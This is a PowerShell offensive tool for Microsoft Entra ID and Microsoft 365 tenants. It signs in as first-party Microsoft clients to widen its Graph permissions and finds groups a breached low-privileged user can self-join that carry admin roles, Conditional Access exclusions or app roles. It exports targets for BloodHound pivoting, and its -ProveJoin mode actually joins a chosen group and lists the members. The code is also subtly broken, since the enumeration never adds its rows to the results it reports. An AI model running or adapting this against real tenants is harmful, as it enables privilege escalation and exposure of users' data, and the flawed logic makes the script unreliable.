<#
.SYNOPSIS
    Microsoft Auto Approved DL Account Takeover (MAADAT) Recon (delegated / assumed-breach vantage).
.DESCRIPTION
    Run as a low-privileged ("breached") user. Enumerates groups the account can
    self-join without owner approval and correlates each to privilege (role-assignable,
    active/PIM-eligible directory roles, Conditional Access include/exclude, app-role
    grants), plus flags dynamic groups whose membership rule keys on user-mutable
    attributes. READ-ONLY by default.

    Authentication uses the OAuth device-code flow against a first-party (FOCI) Microsoft
    client - the Microsoft.Graph module is not required and all Graph calls are raw REST.
    The chosen client's pre-consented delegated permissions bound what is readable; the
    default is the Microsoft Office client, switch to the Azure CLI client via
    -FirstPartyClientId for a broader delegated footprint. Distribution-group enumeration
    still uses the ExchangeOnlineManagement module and is skippable with -SkipExchange.

    Use -ProveJoin <group> to empirically prove exploitability by actually self-adding
    to ONE specified group; pair with -RevertAfter to remove yourself again. Mutation is
    OFF unless -ProveJoin is supplied, and every change is logged.
.PARAMETER FirstPartyClientId
    AppId of the first-party Microsoft client to authenticate as. Default is the Microsoft
    Office client (d3590ed6-52b3-4102-aeff-aad2292ab01c); the Azure CLI client
    (04b07795-8ddb-461a-bbee-02f9e1bf7b46) carries broader delegated Graph scopes.
.PARAMETER ProveJoin
    objectId or identity of ONE group to actually self-join (proves the finding).
.PARAMETER RevertAfter
    After a successful -ProveJoin, remove yourself from the group again.
.EXAMPLE
    .\Invoke-MAADATRecon.ps1 -UserPrincipalName user@contoso.onmicrosoft.com
    .\Invoke-MAADATRecon.ps1 -FirstPartyClientId 04b07795-8ddb-461a-bbee-02f9e1bf7b46 -TenantId contoso.onmicrosoft.com
    .\Invoke-MAADATRecon.ps1 -ProveJoin <groupId> -RevertAfter
    .\Invoke-MAADATRecon.ps1 -TenantId contoso.com -AuthMethod Interactive
    .\Invoke-MAADATRecon.ps1 -TenantId contoso.com -AuthMethod Interactive -ProveJoin "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx" -RevertAfter
    .\Invoke-MAADATRecon.ps1 -TenantId contoso.com -OutputPath "C:\Reports\contoso_recon.json"
    .\Invoke-MAADATRecon.ps1 -TenantId contoso.com -OutputPath "C:\Reports\contoso_recon.json" -IncludeBloodHoundIds
#>

[CmdletBinding(DefaultParameterSetName = 'Enumerate', SupportsShouldProcess, ConfirmImpact = 'High')]
param(
    [string]$TenantId,
    [string]$UserPrincipalName,
    [string]$FirstPartyClientId = 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
    [string]$OutputPath = (Join-Path (Get-Location) ("MAADATRecon_AltRecon_{0}.json" -f (Get-Date -Format 'yyyyMMdd_HHmmss'))),
    [switch]$SkipExchange,
    [switch]$IncludeBloodHoundIds,
    [switch]$IncludeGroupMembers,
    [ValidateSet('DeviceCode', 'Interactive')]
    [string]$AuthMethod = 'DeviceCode',
    [string]$ClientSecret,
    [string]$CertificateThumbprint,
    [Parameter(ParameterSetName = 'Prove', Mandatory)][ValidateNotNullOrEmpty()][string]$ProveJoin,
    [Parameter(ParameterSetName = 'Prove')][switch]$RevertAfter
)

$ErrorActionPreference = 'Stop'

# Attributes a standard user (or a guest in their home tenant) can typically self-edit.
# A dynamic rule keyed on any of these is a candidate escalation vector.
$UserMutableAttributes = @(
    'department', 'jobTitle', 'city', 'state', 'country', 'otherMails', 'displayName',
    'givenName', 'surname', 'mobilePhone', 'streetAddress', 'preferredLanguage', 'faxNumber'
) + (1..15 | ForEach-Object { "extensionAttribute$_" })

function Write-Log {
    param([string]$Message, [ValidateSet('INFO', 'WARN', 'ACTION', 'RESULT')] [string]$Level = 'INFO')
    $color = @{ INFO = 'Gray'; WARN = 'Yellow'; ACTION = 'Magenta'; RESULT = 'Cyan' }[$Level]
    Write-Host ("[{0}] {1}" -f $Level, $Message) -ForegroundColor $color
}

# Original device code auth function, now replaced by a more flexible approach that supports multiple auth methods. Kept for reference and potential future use.
<# function Get-GraphToken {
    param([string]$ClientId, [string]$Resource, [string]$Tenant)
    $dc = Invoke-RestMethod -Method Post `
        -Uri "https://login.microsoftonline.com/$Tenant/oauth2/devicecode?api-version=1.0" `
        -Body @{ client_id = $ClientId; resource = $Resource }
    Write-Host $dc.message -ForegroundColor Yellow
    $interval = [int]$dc.interval
    $deadline = (Get-Date).AddSeconds([int]$dc.expires_in)
    while ((Get-Date) -lt $deadline) {
        Start-Sleep -Seconds $interval
        try {
            return Invoke-RestMethod -Method Post -ErrorAction Stop `
                -Uri "https://login.microsoftonline.com/$Tenant/oauth2/token?api-version=1.0" `
                -Body @{
                grant_type = 'device_code'
                code       = $dc.device_code
                client_id  = $ClientId
                resource   = $Resource
            }
        }
        catch {
            $err = ($_.ErrorDetails.Message | ConvertFrom-Json).error
            switch ($err) {
                'authorization_pending' { continue }
                'slow_down' { $interval += 5; continue }
                default { throw "Device code auth failed: $err" }
            }
        }
    }
    throw 'Device code expired before authentication completed.'
} #>

function Get-GraphToken {
    param([string]$ClientId, [string]$Resource, [string]$Tenant)
    switch ($AuthMethod) {
        'DeviceCode' { return Get-GraphTokenDeviceCode -ClientId $ClientId -Resource $Resource -Tenant $Tenant }
        'Interactive' { return Get-GraphTokenInteractive -ClientId $ClientId -Resource $Resource -Tenant $Tenant }
    }
}

function Get-GraphTokenDeviceCode {
    param([string]$ClientId, [string]$Resource, [string]$Tenant)
    $dc = Invoke-RestMethod -Method Post `
        -Uri "https://login.microsoftonline.com/$Tenant/oauth2/devicecode?api-version=1.0" `
        -Body @{ client_id = $ClientId; resource = $Resource }
    Write-Host $dc.message -ForegroundColor Yellow
    $interval = [int]$dc.interval
    $deadline = (Get-Date).AddSeconds([int]$dc.expires_in)
    while ((Get-Date) -lt $deadline) {
        Start-Sleep -Seconds $interval
        try {
            return Invoke-RestMethod -Method Post -ErrorAction Stop `
                -Uri "https://login.microsoftonline.com/$Tenant/oauth2/token?api-version=1.0" `
                -Body @{
                grant_type = 'device_code'
                code       = $dc.device_code
                client_id  = $ClientId
                resource   = $Resource
            }
        }
        catch {
            $err = ($_.ErrorDetails.Message | ConvertFrom-Json).error
            switch ($err) {
                'authorization_pending' { continue }
                'slow_down' { $interval += 5; continue }
                default { throw "Device code auth failed: $err" }
            }
        }
    }
    throw 'Device code expired before authentication completed.'
}

# Use Az CLI's interactive auth flow, which supports a broader set of delegated permissions than the Microsoft Office client. This is especially useful for tenants with restrictive consent policies where device code auth may be blocked or limited.
function Get-GraphTokenInteractive {
    param([string]$ClientId, [string]$Resource, [string]$Tenant)
    Add-Type -AssemblyName System.Web
    $interactiveClientId = '04b07795-8ddb-461a-bbee-02f9e1bf7b46'
    $redirectUri = 'http://localhost:8400'
    $state = [System.Guid]::NewGuid().ToString()
    $authUrl = "https://login.microsoftonline.com/$Tenant/oauth2/authorize" +
    "?client_id=$interactiveClientId&response_type=code&redirect_uri=$([Uri]::EscapeDataString($redirectUri))" +
    "&resource=$([Uri]::EscapeDataString($Resource))&state=$state&prompt=select_account"
    $listener = [System.Net.HttpListener]::new()
    $listener.Prefixes.Add("$redirectUri/")
    $listener.Start()
    Start-Process $authUrl
    Write-Log "Browser opened - complete sign-in to continue." 'INFO'
    $context = $listener.GetContext()
    $query = [System.Web.HttpUtility]::ParseQueryString($context.Request.Url.Query)
    $response = $context.Response
    $response.StatusCode = 200
    $buffer = [System.Text.Encoding]::UTF8.GetBytes('<html><body>Authentication complete. You may close this window.</body></html>')
    $response.OutputStream.Write($buffer, 0, $buffer.Length)
    $response.Close()
    $listener.Stop()
    if ($query['state'] -ne $state) { throw 'State mismatch - possible CSRF.' }
    if ($query['error']) { throw "Interactive auth failed: $($query['error_description'])" }
    return Invoke-RestMethod -Method Post `
        -Uri "https://login.microsoftonline.com/$Tenant/oauth2/token" `
        -Body @{
        grant_type   = 'authorization_code'
        code         = $query['code']
        client_id    = $interactiveClientId
        redirect_uri = $redirectUri
        resource     = $Resource
    }
}

function Update-GraphToken {
    $refreshed = Invoke-RestMethod -Method Post `
        -Uri "https://login.microsoftonline.com/$($Script:Auth.Tenant)/oauth2/token" `
        -Body @{
        grant_type    = 'refresh_token'
        refresh_token = $Script:Auth.RefreshToken
        client_id     = $Script:Auth.ClientId
        resource      = 'https://graph.microsoft.com'
    }
    $Script:Auth.AccessToken = $refreshed.access_token
    $Script:Auth.RefreshToken = $refreshed.refresh_token
}

function Invoke-GraphRequest {
    param(
        [string]$Method = 'GET',
        [Parameter(Mandatory)][string]$Uri,
        [hashtable]$Headers = @{},
        $Body
    )
    $attempt = 0
    while ($true) {
        $attempt++
        $h = @{ Authorization = "Bearer $($Script:Auth.AccessToken)" }
        foreach ($k in $Headers.Keys) { $h[$k] = $Headers[$k] }
        $params = @{ Method = $Method; Uri = $Uri; Headers = $h }
        if ($null -ne $Body) {
            $params.Body = ($Body | ConvertTo-Json -Depth 10)
            $params.ContentType = 'application/json'
        }
        try {
            return Invoke-RestMethod @params -ErrorAction Stop
        }
        catch {
            $status = $_.Exception.Response.StatusCode.value__
            if ($status -eq 401 -and $attempt -eq 1) {
                Update-GraphToken
                continue
            }
            throw
        }
    }
}

function Invoke-GraphGetAll {
    # Paginated GET with 429 retry. $Eventual adds advanced-query headers.
    param([string]$Uri, [switch]$Eventual)
    $headers = @{}
    if ($Eventual) { $headers['ConsistencyLevel'] = 'eventual' }
    $items = [System.Collections.Generic.List[object]]::new()
    $next = $Uri
    while ($next) {
        try {
            $resp = Invoke-GraphRequest -Method GET -Uri $next -Headers $headers
        }
        catch {
            if ($_.Exception.Message -match '429') {
                Start-Sleep -Seconds 3
                $resp = Invoke-GraphRequest -Method GET -Uri $next -Headers $headers
            }
            else { throw }
        }
        if ($resp.value) { $resp.value | ForEach-Object { $items.Add($_) } }
        elseif ($resp -and -not $resp.PSObject.Properties['value']) { $items.Add($resp) }
        $next = $resp.'@odata.nextLink'
    }
    return $items
}

function Test-DynamicRuleExploitable {
    param([string]$Rule)
    if ([string]::IsNullOrWhiteSpace($Rule)) { return $null }
    $hits = $UserMutableAttributes | Where-Object { $Rule -match "user\.$([regex]::Escape($_))\b" }
    if (-not $hits) { return $null }
    $guestExcluded = $Rule -match 'user\.userType\s*-ne\s*"Guest"'
    return [PSCustomObject]@{
        MutableAttributes = @($hits)
        GuestExcluded     = [bool]$guestExcluded
    }
}

# Original risk tiering function, now replaced by a more nuanced approach that considers multiple privilege and CA factors. Kept for reference and potential future use.
<# function Get-RiskTier {
    param([pscustomobject]$Group)
    $p = $Group.Privilege
    if ($p.HasRoleAssigned -or $p.HasEligibleRole -or $p.CAExcludeGroup) { return 'Critical' }
    if ($Group.IsRoleAssignable -or $p.CAIncludeGroup -or $p.AppRoleGrants -or
        ($Group.DynamicExploitable -and -not $Group.DynamicExploitable.GuestExcluded)) { return 'High' }
    if ($Group.MailEnabled) { return 'Medium' }   # possible shared-identity / inbox-exposure vector
    return 'Low'
} #>

function Get-RiskTier {
    param([pscustomobject]$Group)
    $p = $Group.Privilege
    if ($p.HasRoleAssigned -or $p.HasEligibleRole -or $p.CAExcludeGroup) { return 'Critical' }
    if ($Group.IsRoleAssignable -or $p.CAIncludeGroup -or $p.HasAppRoles -or
        ($Group.DynamicExploitable -and -not $Group.DynamicExploitable.GuestExcluded)) { return 'High' }
    if ($Group.MailEnabled -and $Group.JoinRestriction -ne 'ApprovalRequired') { return 'Medium' }
    if ($Group.MailEnabled -and $Group.JoinRestriction -eq 'ApprovalRequired') { return 'Low' }
    return 'Low'
}

# ---- Connect ---------------------------------------------------------------
$readScopes = @('Group.Read.All', 'Directory.Read.All', 'Policy.Read.All',
    'RoleManagement.Read.Directory', 'Application.Read.All', 'User.Read')
$scopes = $readScopes
if ($PSCmdlet.ParameterSetName -eq 'Prove') { $scopes += 'GroupMember.ReadWrite.All' }

$tenant = if ($TenantId) { $TenantId } else { 'common' }
Write-Log "Authenticating to Microsoft Graph (device code, client $FirstPartyClientId) - delegated scopes needed: $($scopes -join ', ')"
$token = Get-GraphToken -ClientId $FirstPartyClientId -Resource 'https://graph.microsoft.com' -Tenant $tenant
$Script:Auth = [PSCustomObject]@{
    AccessToken  = $token.access_token
    RefreshToken = $token.refresh_token
    ClientId     = $FirstPartyClientId
    Tenant       = $tenant
}

$me = Invoke-GraphRequest -Method GET -Uri 'https://graph.microsoft.com/v1.0/me?$select=id,userPrincipalName'
$meId = $me.id
Write-Log "Acting as: $($me.userPrincipalName) ($meId)"

if (-not $SkipExchange) {
    try {
        $exoConnect = @{ ShowBanner = $false }
        if ($UserPrincipalName) { $exoConnect['UserPrincipalName'] = $UserPrincipalName }
        Connect-ExchangeOnline @exoConnect
    }
    catch {
        Write-Log "Exchange Online connect failed ($($_.Exception.Message)). DL enumeration skipped - use the app-only inspector for DLs." 'WARN'
        $SkipExchange = $true
    }
}

# ---- Helper Functions ---------------------------------------------
function Get-GroupMembers {
    param([string]$GroupId)
    try {
        $members = Invoke-GraphGetAll -Uri "https://graph.microsoft.com/v1.0/groups/$GroupId/members?`$select=id,displayName,userPrincipalName,userType,jobTitle,department"
        return @($members | ForEach-Object {
                [PSCustomObject]@{
                    ObjectId          = $_.id
                    DisplayName       = $_.displayName
                    UserPrincipalName = $_.userPrincipalName
                    UserType          = $_.userType
                    JobTitle          = $_.jobTitle
                    Department        = $_.department
                }
            })
    }
    catch {
        Write-Log "Member enumeration failed for $GroupId ($($_.Exception.Message))" 'WARN'
        return @()
    }
}

# ---- Fetch tenant context once ---------------------------------------------
Write-Log "Enumerating Conditional Access policies..."
$caPolicies = @()
try {
    $caPolicies = Invoke-GraphGetAll -Uri ('https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies' +
        '?$select=id,displayName,state,conditions,grantControls')
}
catch { Write-Log "CA policy read denied ($($_.Exception.Message)) - CA correlation unavailable." 'WARN' }

function Get-CALinkage {
    param([string]$GroupId)
    $inc = @(); $exc = @()
    foreach ($pol in $caPolicies) {
        $u = $pol.conditions.users
        if ($u.includeGroups -contains $GroupId) { $inc += $pol.displayName }
        if ($u.excludeGroups -contains $GroupId) { $exc += $pol.displayName }
    }
    [PSCustomObject]@{ Include = $inc; Exclude = $exc }
}

function Get-GroupPrivilege {
    param([string]$GroupId)
    $roleAssigned = @(); $roleEligible = @(); $appRoles = @()
    try {
        $ra = Invoke-GraphGetAll -Uri ("https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?`$filter=principalId eq '$GroupId'&`$expand=roleDefinition")
        $roleAssigned = @($ra | ForEach-Object { $_.roleDefinition.displayName })
    }
    catch {}
    try {
        $re = Invoke-GraphGetAll -Uri ("https://graph.microsoft.com/v1.0/roleManagement/directory/roleEligibilitySchedules?`$filter=principalId eq '$GroupId'&`$expand=roleDefinition")
        $roleEligible = @($re | ForEach-Object { $_.roleDefinition.displayName })
    }
    catch {}
    try {
        try {
            $ar = Invoke-GraphGetAll -Uri "https://graph.microsoft.com/v1.0/groups/$GroupId/appRoleAssignments"
            $spCache = @{}
            $appRoles = @($ar | ForEach-Object {
                    $grant = $_
                    $spId = $grant.resourceId
                    if (-not $spCache.ContainsKey($spId)) {
                        try {
                            $sp = Invoke-GraphRequest -Method GET -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$spId`?`$select=displayName,appRoles"
                            $spCache[$spId] = $sp
                        }
                        catch {
                            $spCache[$spId] = $null
                        }
                    }
                    $sp = $spCache[$spId]
                    $roleName = $null
                    $roleDescription = $null
                    if ($sp -and $grant.appRoleId -ne '00000000-0000-0000-0000-000000000000') {
                        $resolved = $sp.appRoles | Where-Object { $_.id -eq $grant.appRoleId } | Select-Object -First 1
                        $roleName = $resolved.displayName
                        $roleDescription = $resolved.description
                    }
                    [PSCustomObject]@{
                        Resource        = $grant.resourceDisplayName
                        ResourceId      = $spId
                        AppRoleId       = $grant.appRoleId
                        RoleName        = if ($roleName) { $roleName } else { 'Default Access' }
                        RoleDescription = $roleDescription
                    }
                })
        }
        catch { $appRoles = @() }
    }
    catch {}
    $ca = Get-CALinkage -GroupId $GroupId
    [PSCustomObject]@{
        HasRoleAssigned = [bool]$roleAssigned.Count
        RolesAssigned   = $roleAssigned
        HasEligibleRole = [bool]$roleEligible.Count
        RolesEligible   = $roleEligible
        AppRoleGrants   = $appRoles
        HasAppRoles     = [bool]$appRoles.Count
        CAIncludeGroup  = [bool]$ca.Include.Count
        CAExcludeGroup  = [bool]$ca.Exclude.Count
        CAIncludes      = $ca.Include
        CAExcludes      = $ca.Exclude
    }
}

# ---- M365 (Unified) groups: Public = self-join, no approval ----------------
if ($PSCmdlet.ParameterSetName -ne 'Prove') {
    Write-Log "Enumerating groups via Graph..."
    $allGroups = Invoke-GraphGetAll -Eventual -Uri ('https://graph.microsoft.com/v1.0/groups?$count=true&$select=' +
        'id,displayName,visibility,mail,mailEnabled,securityEnabled,isAssignableToRole,groupTypes,membershipRule,assignedLicenses')

    $results = [System.Collections.Generic.List[object]]::new()

    foreach ($g in $allGroups) {
        $isUnified = $g.groupTypes -contains 'Unified'
        $isDynamic = $g.groupTypes -contains 'DynamicMembership'
        $publicJoin = $isUnified -and ($g.visibility -eq 'Public')
        $dynExploit = if ($isDynamic) { Test-DynamicRuleExploitable -Rule $g.membershipRule } else { $null }

        # Include a group if it is self-joinable (public M365) OR a dynamic group with an exploitable rule.
        if (-not ($publicJoin -or $dynExploit)) { continue }

        $row = [PSCustomObject]@{
            DisplayName        = $g.displayName
            ObjectId           = $g.id
            JoinVector         = if ($publicJoin) { 'Public M365 group (self-join, no approval)' } else { 'Dynamic membership (attribute-driven)' }
            Mail               = $g.mail
            MailEnabled        = [bool]$g.mailEnabled
            IsRoleAssignable   = [bool]$g.isAssignableToRole
            IsDynamic          = $isDynamic
            DynamicExploitable = $dynExploit
            HasLicenses        = [bool]($g.assignedLicenses.Count)
            Privilege          = Get-GroupPrivilege -GroupId $g.id
            Members            = if ($IncludeGroupMembers) { Get-GroupMembers -GroupId $g.id } else { $null }
            MemberCount        = $null
            RiskTier           = $null
        }
        $row.MemberCount = if ($row.Members) { $row.Members.Count } else { $null }
        $row.RiskTier = Get-RiskTier -Group $row
    }

    # ---- Open distribution / mail-enabled security groups ----------------------
    if (-not $SkipExchange) {
        Write-Log "Enumerating distribution groups via Exchange Online..."
        try {
            $openDLs = Get-DistributionGroup -ResultSize Unlimited |
            Where-Object { $_.MemberJoinRestriction -in 'Open', 'ApprovalRequired' }
            foreach ($dl in $openDLs) {
                $gid = $dl.ExternalDirectoryObjectId
                $priv = if ($gid) { Get-GroupPrivilege -GroupId $gid } else {
                    [PSCustomObject]@{ HasRoleAssigned = $false; RolesAssigned = @(); HasEligibleRole = $false; RolesEligible = @(); AppRoleGrants = @(); CAIncludeGroup = $false; CAExcludeGroup = $false; CAIncludes = @(); CAExcludes = @() }
                }
                
                $row = [PSCustomObject]@{
                    DisplayName        = $dl.DisplayName
                    ObjectId           = $gid
                    JoinVector         = "Distribution/MESG (MemberJoinRestriction = $($dl.MemberJoinRestriction))"
                    Mail               = $dl.PrimarySmtpAddress
                    MailEnabled        = $true
                    IsRoleAssignable   = $false
                    IsDynamic          = $false
                    DynamicExploitable = $null
                    HasLicenses        = $false
                    Privilege          = $priv
                    Members            = if ($IncludeGroupMembers) { Get-GroupMembers -GroupId $gid } else { $null }
                    MemberCount        = $null
                    RiskTier           = $null
                }
                $row.MemberCount = if ($row.Members) { $row.Members.Count } else { $null }
                $row.RiskTier = Get-RiskTier -Group $row
            }
        }
        catch { Write-Log "Get-DistributionGroup failed/limited ($($_.Exception.Message)) - likely insufficient EXO RBAC for this user." 'WARN' }
    }
}
# ---- Report ----------------------------------------------------------------
$tierOrder = @{ Critical = 0; High = 1; Medium = 2; Low = 3 }
$sorted = $results | Sort-Object @{ E = { $tierOrder[$_.RiskTier] } }, DisplayName

if ($PSCmdlet.ParameterSetName -ne 'Prove') {
    Write-Log ("Self-joinable / exploitable groups found: {0}" -f $sorted.Count) 'RESULT'
}

$sorted | Format-Table -AutoSize DisplayName, RiskTier, JoinVector,
@{ N = 'Members'; E = { if ($null -ne $_.MemberCount) { $_.MemberCount } else { '-' } } },
@{ N = 'Roles'; E = { ($_.Privilege.RolesAssigned + $_.Privilege.RolesEligible) -join ',' } },
@{ N = 'AppRoles'; E = { ($_.Privilege.AppRoleGrants | ForEach-Object { "$($_.Resource)\$($_.RoleName)" }) -join ',' } },
@{ N = 'CA'; E = { if ($_.Privilege.CAExcludeGroup) { 'EXCLUDE' } elseif ($_.Privilege.CAIncludeGroup) { 'include' } else { '' } } }

$sorted | ConvertTo-Json -Depth 6 | Out-File -FilePath $OutputPath -Encoding utf8
Write-Log "Full results written to: $OutputPath" 'RESULT'

if ($IncludeBloodHoundIds) {
    $bhPath = [IO.Path]::ChangeExtension($OutputPath, 'bloodhound.txt')
    $sorted | Where-Object { $_.RiskTier -in 'Critical', 'High' -and $_.ObjectId } |
    Select-Object -ExpandProperty ObjectId | Out-File $bhPath -Encoding utf8
    Write-Log "High-value group objectIds (for AzureHound/BloodHound pivoting): $bhPath" 'RESULT'
}

# ---- Optional: prove exploitability ----------------------------------------
<# if ($PSCmdlet.ParameterSetName -eq 'Prove') {
    $target = $sorted | Where-Object { $_.ObjectId -eq $ProveJoin -or $_.DisplayName -eq $ProveJoin } | Select-Object -First 1
    if (-not $target) { throw "ProveJoin target '$ProveJoin' not found among enumerated self-joinable groups." }

    Write-Log "PROOF-OF-CONCEPT self-join target: $($target.DisplayName) [$($target.RiskTier)] via $($target.JoinVector)" 'ACTION'
    if ($PSCmdlet.ShouldProcess($target.DisplayName, "Self-join group (MUTATING action against the tenant)")) {

        if ($target.JoinVector -like 'Distribution/MESG*') {
            Add-DistributionGroupMember -Identity $target.ObjectId -Member $meId -Confirm:$false
            Write-Log "Self-added to distribution group $($target.DisplayName)." 'RESULT'
            
            if ($RevertAfter) {
                Remove-DistributionGroupMember -Identity $target.ObjectId -Member $meId -Confirm:$false
                Write-Log "Reverted: removed self from $($target.DisplayName)." 'RESULT'
            }
        }
        else {
            $body = @{ '@odata.id' = "https://graph.microsoft.com/v1.0/directoryObjects/$meId" }
            $refUri = 'https://graph.microsoft.com/v1.0/groups/' + $target.ObjectId + '/members/$ref'
            Invoke-GraphRequest -Method POST -Uri $refUri -Body $body
            Write-Log "Self-added to M365 group $($target.DisplayName)." 'RESULT'
            if ($RevertAfter) {
                $delUri = 'https://graph.microsoft.com/v1.0/groups/' + $target.ObjectId + '/members/' + $meId + '/$ref'
                Invoke-GraphRequest -Method DELETE -Uri $delUri
                Write-Log "Reverted: removed self from $($target.DisplayName)." 'RESULT'
            }
        }
    }
} #>

if ($PSCmdlet.ParameterSetName -eq 'Prove') {
    if ($ProveJoin -match '^[0-9a-fA-F]{8}-([0-9a-fA-F]{4}-){3}[0-9a-fA-F]{12}$') {
        $g = Invoke-GraphRequest -Method GET -Uri "https://graph.microsoft.com/v1.0/groups/$ProveJoin`?`$select=id,displayName,groupTypes,mail,mailEnabled,isAssignableToRole,membershipRule,assignedLicenses,visibility"
    }
    else {
        $g = Invoke-GraphGetAll -Uri "https://graph.microsoft.com/v1.0/groups?`$filter=displayName eq '$ProveJoin'&`$select=id,displayName,groupTypes,mail,mailEnabled,isAssignableToRole,membershipRule,assignedLicenses,visibility" -Eventual |
        Select-Object -First 1
        if (-not $g) { throw "No group found with displayName '$ProveJoin'." }
    }
    $isUnified = $g.groupTypes -contains 'Unified'
    $isDynamic = $g.groupTypes -contains 'DynamicMembership'
    $dynExploit = if ($isDynamic) { Test-DynamicRuleExploitable -Rule $g.membershipRule } else { $null }
    $target = [PSCustomObject]@{
        DisplayName        = $g.displayName
        ObjectId           = $g.id
        JoinVector         = if ($isUnified -and $g.visibility -eq 'Public') { 'Public M365 group (self-join, no approval)' } else { 'Dynamic membership (attribute-driven)' }
        Mail               = $g.mail
        MailEnabled        = [bool]$g.mailEnabled
        IsRoleAssignable   = [bool]$g.isAssignableToRole
        IsDynamic          = $isDynamic
        DynamicExploitable = $dynExploit
        HasLicenses        = [bool]($g.assignedLicenses.Count)
        Privilege          = Get-GroupPrivilege -GroupId $g.id
        RiskTier           = $null
    }
    $target.RiskTier = Get-RiskTier -Group $target

    Write-Log "PROOF-OF-CONCEPT self-join target: $($target.DisplayName) [$($target.RiskTier)] via $($target.JoinVector)" 'ACTION'
    if ($PSCmdlet.ShouldProcess($target.DisplayName, "Self-join group (MUTATING action against the tenant)")) {

        if ($target.JoinVector -like 'Distribution/MESG*') {
            Add-DistributionGroupMember -Identity $target.ObjectId -Member $meId -Confirm:$false
            Write-Log "Self-added to distribution group $($target.DisplayName)." 'RESULT'

            Write-Log "Enumerating current members of $($target.DisplayName)..." 'INFO'
            $members = Invoke-GraphGetAll -Uri "https://graph.microsoft.com/v1.0/groups/$($target.ObjectId)/members?`$select=id,displayName,userPrincipalName,userType"
            Write-Log "Current group members ($($members.Count)):" 'RESULT'
            $header = "{0,-40} {1,-50} {2,-10} {3}" -f "DisplayName", "UserPrincipalName", "UserType", "ObjectId"
            Write-Host $header -ForegroundColor White
            Write-Host ("-" * $header.Length) -ForegroundColor White
            foreach ($member in $members) {
                $line = "{0,-40} {1,-50} {2,-10} {3}" -f $member.displayName, $member.userPrincipalName, $member.userType, $member.id
                if ($member.id -eq $meId) {
                    Write-Host $line -ForegroundColor Yellow -NoNewline
                    Write-Host "  +New" -ForegroundColor Green
                }
                else {
                    Write-Host $line
                }
            }

            if ($RevertAfter) {
                Remove-DistributionGroupMember -Identity $target.ObjectId -Member $meId -Confirm:$false
                Write-Log "Reverted: removed self from $($target.DisplayName)." 'RESULT'
            }
        }
        else {
            $body = @{ '@odata.id' = "https://graph.microsoft.com/v1.0/directoryObjects/$meId" }
            $refUri = 'https://graph.microsoft.com/v1.0/groups/' + $target.ObjectId + '/members/$ref'
            Invoke-GraphRequest -Method POST -Uri $refUri -Body $body
            Write-Log "Self-added to M365 group $($target.DisplayName)." 'RESULT'

            Write-Log "Enumerating current members of $($target.DisplayName)..." 'INFO'
            $members = Invoke-GraphGetAll -Uri "https://graph.microsoft.com/v1.0/groups/$($target.ObjectId)/members?`$select=id,displayName,userPrincipalName,userType"
            Write-Log "Current group members ($($members.Count)):" 'RESULT'
            $header = "{0,-40} {1,-50} {2,-10} {3}" -f "DisplayName", "UserPrincipalName", "UserType", "ObjectId"
            Write-Host $header -ForegroundColor White
            Write-Host ("-" * $header.Length) -ForegroundColor White
            foreach ($member in $members) {
                $line = "{0,-40} {1,-50} {2,-10} {3}" -f $member.displayName, $member.userPrincipalName, $member.userType, $member.id
                if ($member.id -eq $meId) {
                    Write-Host $line -ForegroundColor Yellow -NoNewline
                    Write-Host "  +New" -ForegroundColor Green
                }
                else {
                    Write-Host $line
                }
            }

            if ($RevertAfter) {
                $delUri = 'https://graph.microsoft.com/v1.0/groups/' + $target.ObjectId + '/members/' + $meId + '/$ref'
                Invoke-GraphRequest -Method DELETE -Uri $delUri
                Write-Log "Reverted: removed self from $($target.DisplayName)." 'RESULT'
            }
        }
    }
}